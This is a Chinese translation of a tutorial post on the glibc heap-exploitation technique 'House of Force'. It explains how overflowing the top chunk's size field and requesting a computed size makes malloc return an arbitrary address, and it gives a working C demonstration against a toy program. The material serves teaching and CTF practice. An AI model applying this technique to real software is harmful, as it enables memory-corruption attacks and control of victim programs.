---
title: Heap Exploitation系列翻译-15 House of Force
tags: [CTF, pwn, heap]
layout: post
categories: translations
---


> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

与'House of Lore'类似, 这项攻击重点在于从'malloc'返回一个任意的指针. 伪造堆块攻击讨论的是fastbins的情况而'House of Lore'讨论的则是small bin的情况. 在这里'House of Force'则是利用了'top chunk'. topmost chunk 也被称作 'wilderness', 它以堆的末尾作为边界(比如, 它是堆的最大地址)并且不会出现在任何bin链中. 它符合相同的堆块结构格式.

这项攻击技术假定在top chunk的首部存在溢出. 它的`size`可以被修改为一个非常大的值(在本例中是`-1`), 这能够确保所有初始申请将会使用top chunk来满足要求, 而非依赖于`mmap`. 在64位系统, `-1`即是`0xFFFFFFFFFFFFFFFF`, 一个这样大小的堆块可以覆盖程序的整个内存空间. 让我们假定一下, 攻击者希望'malloc'返回地址'P'. 现在, 任何大小为`&top_chunk` - `P`的malloc调用都会使用top chunk来满足. 要注意, `P`可以在`top_chunk`之前或之后. 如果是在前面, 结果就得是一个很大的整数(因为size是无符号的). 但它仍旧是小于`-1`的. 在发生完整数溢出并且malloc使用top chunk很好的满足申请需求后, 此刻, top chunk就会指向`P`并且之后的任何申请都会直接返回`P`!

考虑以下示例代码(下载完整版本: [这里](https://heap-exploitation.dhavalkapil.com/assets/files/house_of_force.c)):

```c
// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc"; // At 0x601060

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

struct chunk_structure *chunk, *top_chunk;
unsigned long long *ptr;
size_t requestSize, allotedSize;

// First, request a chunk, so that we can get a pointer to top chunk
ptr = malloc(256);                                                    // At 0x131a010
chunk = (struct chunk_structure *)(ptr - 2);                          // At 0x131a000

// lower three bits of chunk->size are flags
allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

// top chunk will be just next to 'ptr'
top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);  // At 0x131a110

// here, attacker will overflow the 'size' parameter of top chunk
top_chunk->size = -1;       // Maximum size

// Might result in an integer overflow, doesn't matter
requestSize = (size_t)victim            // The target address that malloc should return
                - (size_t)top_chunk     // The present address of the top chunk
                - 2*sizeof(long long)   // Size of 'size' and 'prev_size'
                - sizeof(long long);    // Additional buffer

// This also needs to be forced by the attacker
// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
// Making it point to 'victim'
malloc(requestSize);                                                  // At 0x131a120

// The top chunk again will service the request and return 'victim'
ptr = malloc(100);                                // At 0x601060 !! (Same as 'victim')
```

'malloc' 返回一个指向`victim`的地址

以下几样需要我们注意:

1. 当计算`to_chunk`的准确指针时, 要将prev_size的三个最低位清零, 以获得准确的大小.
2. 当计算requestSize, 需要算进一个额外的缓冲区, 这只是用于抵消分配堆块时进行的四舍五入. 顺便一提, 在这种情况下, malloc 会返回一个比申请大小多8字节的堆块. 要注意, 这是与机器相关的.
3. `victim`可以是任意地址(堆,栈,bss段等地址)
